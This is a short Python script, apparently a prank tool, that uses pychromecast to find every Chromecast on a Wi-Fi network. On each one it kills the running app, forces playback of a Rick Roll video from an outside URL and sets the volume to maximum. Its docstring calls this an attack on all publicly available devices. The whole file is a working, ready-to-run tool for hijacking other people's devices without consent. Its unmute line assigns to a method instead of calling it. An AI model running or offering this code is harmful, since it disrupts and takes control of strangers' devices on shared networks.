# Pi Rick Roll Instigating Controller
# main.py


import pychromecast
import time


"""
This script will launch an attack on all publicly available Google Chromecasts on a Wi-Fi network
and will play the media selection of choice.

This code is based heavily on the blocking example code found at:
https://github.com/balloob/pychromecast/blob/master/examples/blocking.py
"""


MEDIA_LINK = 'http://cobelu.com/resources/Videos/rick_roll.mp4'
MEDIA_TYPE = 'video/mp4'


def main():

    # Get a list of all public Chromecasts on the network
    casts = pychromecast.get_chromecasts()
    num = len(casts)

    # In the event no devices were found, we should give up then
    if num == 0:
        print("No devices were found... :(")
        exit()

    # Otherwise, we'll start hitting everything we found
    count = 0
    while count < num:

        # Count through each cast on the network
        cast = casts[count]
        mc = cast.media_controller

        # Begin logging for debug
        print(cast.device)
        time.sleep(3)
        print(cast.status)
        print(cast.media_controller.status)

        # Make sure they're watching our media
        if mc.status.content_id != MEDIA_LINK:
            if not cast.is_idle:
                print("Killing current running task...")
                cast.quit_app()
                time.sleep(5)
            cast.play_media(MEDIA_LINK, MEDIA_TYPE)

        # Make sure the sound is on
        if cast.status.volume_muted == True:
            cast.set_volume_muted = False

        # Make sure their sound is maxed
        if cast.status.volume_level != 1:
            cast.set_volume(1)

        # Make sure they're still playing
        mc.play()

        # End of line cleanup before moving on to next target
        print("--------------------")
        time.sleep(1)
        count += 1


if __name__ == "__main__":
    main()
